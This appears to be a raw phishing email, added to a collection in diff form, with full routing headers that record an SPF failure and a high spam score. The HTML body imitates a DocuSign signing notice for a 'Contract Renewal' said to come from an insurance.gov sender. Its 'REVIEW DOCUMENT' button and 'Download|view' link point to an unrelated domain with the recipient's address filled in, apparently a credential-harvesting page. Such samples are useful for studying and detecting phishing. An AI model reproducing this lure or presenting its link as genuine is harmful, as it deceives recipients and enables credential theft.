@@ -1,0 +1,206 @@
+Return-Path: dxboffice@pab.ae
+Delivered-To: jose@monkey.org
+X-FDA: 82997628294.36.047C3C3
+Received: from stradwhm.stradsolutions.com (stradwhm.stradsolutions.com
+ [103.87.173.15])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id 030EE1A0002
+	for <jose@monkey.org>; Sun, 12 Jan 2025 05:14:00 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=fail (imf27.b.hostedemail.com: domain of dxboffice@pab.ae does not
+ designate 103.87.173.15 as permitted sender) smtp.mailfrom=dxboffice@pab.ae
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1736658841;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=OEmM5q2tlR+XtrY9kc/sthFEgv6JH4eSl4u3URhKUAY=;
+	b=iU9t+PeYoS2KR4xGSxBzGEoB0xaJWyqCAKR1BOJ4k0oqAHCWVkrSazsx9lSC8ege7giPYS
+	jT409mYFiq1zInXA30M1GPT4lT+k6dXTBmK/KG6OMZ/Vd6hYkjXJ+1Hdtjm+2SirtxGn/F
+	0gGf+Wm5JxHUYnJ5QyYReko/YX7LDnA=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=fail (imf27.b.hostedemail.com: domain of dxboffice@pab.ae does not
+ designate 103.87.173.15 as permitted sender) smtp.mailfrom=dxboffice@pab.ae
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1736658841; a=rsa-sha256;
+	cv=none;
+	b=UAL2ZiTowXvUsGqQWbPnyemsvm5xe3ZCj7ZY7hhBHigV4xRmt0bQOKmz8qdmchwXOtvyiH
+	vPH8kf+p5Vw2IYiz1oNzETALMUICOWhTR6f5vX19t5YyRGrkZUyPA2mp4AVr04LatDCt+g
+	gT18RpHc3cV/0aYePz/ALSps0x79MQM=
+Received: from ec2-52-192-94-191.ap-northeast-1.compute.amazonaws.com
+ ([52.192.94.191]:57756)
+	by stradwhm.stradsolutions.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <dxboffice@pab.ae>)
+	id 1tWXRy-005bNO-0P
+	for jose@monkey.org;
+	Sat, 11 Jan 2025 14:36:30 +0530
+From: "Dxboffice"<dxboffice@pab.ae>
+To: jose@monkey.org
+Subject: RE: Completed: Contract Renewal PO64199 Agreement Contract .gov jose
+Date: 11 Jan 2025 09:06:28 +0000
+Message-ID: <20250111090628.4B9F4EE9E063F1CE@pab.ae>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - stradwhm.stradsolutions.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - pab.ae
+X-Get-Message-Sender-Via: stradwhm.stradsolutions.com: authenticated_id:
+ info@candourtankers.ae
+X-Authenticated-Sender: stradwhm.stradsolutions.com: info@candourtankers.ae
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspam-User: 
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 030EE1A0002
+X-Spam-Status: Yes, score=16.18
+X-Stat-Signature: q37g1hoho56fri9h3cwz495s18q9o5wm
+X-HE-Tag: 1736658840-952247
+X-HE-Meta: 
+ U2FsdGVkX19O+phcYOXTTxI3/gAVP76UM4LodWUETNzYxP90Y8NAgQkdoSOV8iptFun77KDfOQyZy2lR1aMkBiqSV+yCjhhkSEeytUUHnI4dgeufCi1Gw0fXkq/7N66XDQuLOHEieArFbujGgxPYbYhjXjkABQoTbVxI+3JcNxXZFJrFWCopc7j9B5k9lRrDoEbCnCaku+7XfZHoDPz9QMaGjFhGLsko5txS5NJFcQmCZNykWoj7Em72JDZSOgwjpmUlC+TQDJ6gujUdGiIDjheiX28uyFgC1rk+XX4AVtCGWNoKoEVeHbRzqxMYfmaZ3xpKG/nEobuE50FqkN21NRg5vPabaQW5+NxVf9qSLKMiZjlg3n2WwwSHikMd92+Ly7B1+gWoJjVmOla1Jppb7CfwgJIgCGKPtgVHejCWTW/LzYfnhxpgzSkuL4J7b1H3YPSBB8LxUIvGM/aun0nvKmidJmYdWUEAqpV0njGOpxxrgHuBX7ZdDOzgpNVAWGymuGf1GvgF58fcKMi5edPYVvuEniE9xAB1v5omKQfBdUM94VctO0DHal9Y+JKwVwbLlS7Wpdck/bGo0sgAM4nnCPOSQulDfBNVQGbj/vMNsuak5g3C2er/drBX4c8NNHGUzPJ2cH8w8Ce8D8nCna/qe1vROnz+NQgmSqx3kYvnIa0D56Cv9a3cUBJIy8oP24LhmUQFrlOKhSBoIldJzkl5vErE+iJ7ZIRWzqVPOySPy/J+lpAXtqccHdEKVq9LXN4I5/FvSYmp4m1UtzgaikvWVAHT9iJvL90uslkDl20oyu1s3gh6HTOtDjZGD6cBBma1ECAJsC2I+49TT51gOXhqjW/XPxksbkhToYyZoZnKwCw8ZeLvHEnPpSWWCGf+qAp0L03WTGomCavii4H5QgOwoZfAJbknVrnw0f9IbpWZ+eNg+hIjwUuT8+Tgq4R2vMnb6IoFuhjEfw5i+LedBuweAFTUP4t
+ xjR/9gDUSIG9APj0mtz379C2128tXhTOMPnvauHdisW9pzC81Kz3WmwKoH/48/3I0xSn85OcfSPCQ6GSZS3aMMjwVnXlQO244pxrny32I5owAEVLUnOp+dgI2lu8ee05nkWJEuS4g2mQo6aStxfaQMMosSEurQ2tvrt1aHDB5769vfNiwXq0LrMvXfAfbWqScFco2t/ZuGjJorXS5pYRag4iAqZCev5hzr7P0bElMVQESKXMlnomVzzmJw5xXw/0lNNRC6PAoMyB97d/xEkp+QsFwMEU+6D+UoN5o/JOrHHPdoGmvBeXuvwEhcLPH0QSWRqyO/l8t2ckjarggdvZLme7f4u9EiJhMLmNXtmVZi+e6x09L+fXBw7z2S0XSqIpeW9jTHpBeoBlsxSUvT66DkvimL0JVi7zxiLSy8EZbLJeYXjZ/TO7LWy5S4G7Egs2mGHc/4NcNQxVbYhQIk3EbHnRTfMTymUit96rRmPvxDKpx+LhjYdNOXrH6ohpDhAhE+uTw9oLGIaXzkcusmHQ8i2kl/gG8QSy84IVZCtC4rxRPH+RuI6GDpC8SeUjma8B152TFB3ev3rRaGqa+IJ4eDJTZ1Xuv/Jr5QlpT+5PiAq9wUAN+ITNUn+0XBnQb4zMHbqhPN29OUsI1VbQQtwW5eKPbR1cFxu/C6FyzCr051NQ1SnAjzRiPNAiR0HW7AZ8vKTAGT7YNAhJBbwQTyXK6kmAppyjFbw77rRjO
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 8
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div id=3D"forwardbody1">
+<div>&nbsp;FYA<br><br class=3D"Apple-interchange-newline">
+<hr style=3D'width: 588px; color: rgb(0, 0, 0); text-transform: none; text-=
+indent: 0px; letter-spacing: normal; font-family: "Segoe UI Web (West Europ=
+ean)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Ne=
+ue", sans-serif; font-size: medium; font-style: normal; font-weight: 400; w=
+ord-spacing: 0px; display: inline-block; white-space: normal; orphans: 2; w=
+idows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webki=
+t-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'>
+<div id=3D"divRplyFwdMsg" style=3D'margin: 0px; padding: 0px; border: 0px c=
+urrentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none;=
+ line-height: inherit; text-indent: 0px; letter-spacing: normal; font-famil=
+y: "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSyste=
+mFont, Roboto, "Helvetica Neue", sans-serif; font-size: medium; font-style:=
+ normal; font-weight: 400; word-spacing: 0px; vertical-align: baseline; whi=
+te-space: normal; orphans: 2; widows: 2;=20
+font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: in=
+herit; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-=
+style: initial; text-decoration-color: initial; font-variant-numeric: inher=
+it; font-variant-east-asian: inherit; font-variant-alternates: inherit; fon=
+t-variant-position: inherit; font-optical-sizing: inherit; font-kerning: in=
+herit; font-variation-settings: inherit;'=20
+dir=3D"ltr"><span style=3D"margin: 0px; padding: 0px; border: 0px currentCo=
+lor; border-image: none; color: rgb(0, 0, 0); line-height: inherit; font-fa=
+mily: Calibri, sans-serif; font-size: 11pt; font-style: inherit; font-varia=
+nt: inherit; font-weight: inherit; vertical-align: baseline; font-size-adju=
+st: inherit; font-stretch: inherit; font-feature-settings: inherit; font-op=
+tical-sizing: inherit; font-kerning: inherit; font-variation-settings: inhe=
+rit;"><b>
+Date: 1/11/2025 9:06:28 a.m. Subject:&nbsp;Contract Renewal&nbsp;Agreement =
+- To: jose@monkey.org</b></span></div></div><div><div class=3D"v1gmail_quot=
+e v1gmail_quote_container">
+<br>
+<div style=3D"padding: 2%; font-family: Helvetica,Arial,Sans Serif; backgro=
+und-color: rgb(234, 234, 234);">
+<table width=3D"100%" align=3D"center" border=3D"0" cellspacing=3D"0" cellp=
+adding=3D"0">
+<tbody>
+<tr>
+<td>&nbsp;</td>
+<td width=3D"640">
+<table style=3D"border-collapse: collapse; max-width: 640px; background-col=
+or: rgb(255, 255, 255);">
+<tbody>
+<tr>
+<td style=3D"padding: 10px 24px;"></td>
+</tr>
+<tr>
+<td style=3D"padding: 0px 24px 30px;">
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(255, 255, 255); =
+background-color: rgb(33, 78, 159);" border=3D"0" cellspacing=3D"0" cellpad=
+ding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" style=3D"padding: 28px 36px 36px; border-radius: 2px; =
+width: 100%; text-align: center; color: rgb(255, 255, 255); font-family: He=
+lvetica,Arial,Sans Serif; font-size: 16px; background-color: rgb(33, 78, 15=
+9);"><img width=3D"75" height=3D"75" style=3D"width: 75px; height: 75px;" s=
+rc=3D"https://eu.docusign.net/member/Images/email/docInvite-white.png">
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" style=3D"border: currentColor; border-image: none; tex=
+t-align: center; color: rgb(255, 255, 255); padding-top: 24px; font-family:=
+ Helvetica,Arial,Sans Serif; font-size: 16px;">PO&nbsp;insurance.gov sent y=
+ou a document to review and sign.</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" style=3D"padding-top: 30px;">
+<div>
+<table cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"44" align=3D"center" style=3D"border-radius: 2px; text-align:=
+ center; color: rgb(51, 51, 51); font-family: Helvetica,Arial,Sans Serif; f=
+ont-size: 15px; font-weight: bold; text-decoration: none; display: block; b=
+ackground-color: rgb(255, 200, 32);">
+<a style=3D"border-radius: 2px; text-align: center; color: rgb(51, 51, 51);=
+ font-family: Helvetica,Arial,Sans Serif; font-size: 15px; font-weight: bol=
+d; text-decoration: none; display: inline-block; background-color: rgb(255,=
+ 200, 32);" href=3D"https://ngk.ae/hurda.html?email=3Djose@monkey.org" targ=
+et=3D"_blank" rel=3D"noopener noreferrer"><span style=3D"padding: 0px 24px;=
+ line-height: 44px;"> REVIEW DOCUMENT </span></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td style=3D"padding: 0px 24px 24px; color: rgb(0, 0, 0); font-family: Helv=
+etica,Arial,Sans Serif; font-size: 16px; background-color: white;"><span st=
+yle=3D"color: rgb(51, 51, 51); line-height: 20px; font-family: Helvetica,Ar=
+ial,Sans Serif; font-size: 15px;">FYA, jose agency Digital contract Agreeme=
+nt for your reviewing and signing.<br></span></td>
+</tr>
+</tbody>
+</table>
+</td>
+<td>&nbsp;</td>
+</tr>
+</tbody>
+</table>
+<span><span><span></span></span></span></div>
+</div>
+</div>
+</div>
+<div id=3D"_rc_sig"></div><br><br><br><br><a href=3D"https://ngk.ae/hurda.h=
+tml?email=3Djose@monkey.org">Download|view</a> attached&nbsp;shared documen=
+t via monkey.org for and on behalf of jose@monkey.org</body></html>
+
